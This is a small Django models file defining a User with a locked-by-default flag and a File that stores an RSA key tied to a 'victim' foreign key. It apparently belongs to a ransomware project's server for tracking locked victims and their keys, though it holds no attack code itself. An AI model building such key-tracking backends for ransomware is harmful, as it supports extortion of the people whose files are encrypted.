from django.db import models

# Create your models here.
class User(models.Model):
    user_id = models.CharField(max_length=32,primary_key=True)
    time = models.DateTimeField()
    locked = models.BooleanField(default=True)
    
    def __str__(self):
        return self.user_id

class File(models.Model):
    rsa_key = models.CharField(max_length=200)
    victim = models.ForeignKey(User,on_delete=models.SET_NULL, null=True)
    
    
    def __str__(self):
        return self.rsa_key